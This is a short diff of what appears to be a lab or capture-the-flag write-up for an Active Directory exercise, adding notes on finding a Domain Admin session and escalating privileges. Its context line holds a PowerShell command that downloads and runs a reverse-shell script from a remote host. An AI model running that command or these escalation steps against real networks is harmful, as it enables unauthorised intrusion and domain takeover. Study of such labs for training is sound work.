@@ -167,3 +167,7 @@ powershell.exe iex (iwr http://172.16.99.115/Invoke-PowerShellTcp.ps1 -UseBasicP
 ### **FLAG 9 - Collection method in BloodHound that covers all the collection methods**
 Launch sharpound on the student vm and export it to kali to use bloodhound
 ### **FLAG 10/11/12/13/14/15 - svcadmin/NTLM **
+- Identify a machine in the target domain where a Domain Admin session is available. 
+- Compromise the machine and escalate privileges to Domain Admin
+	- Using access to dcorp-ci
+	- Using derivative local admin
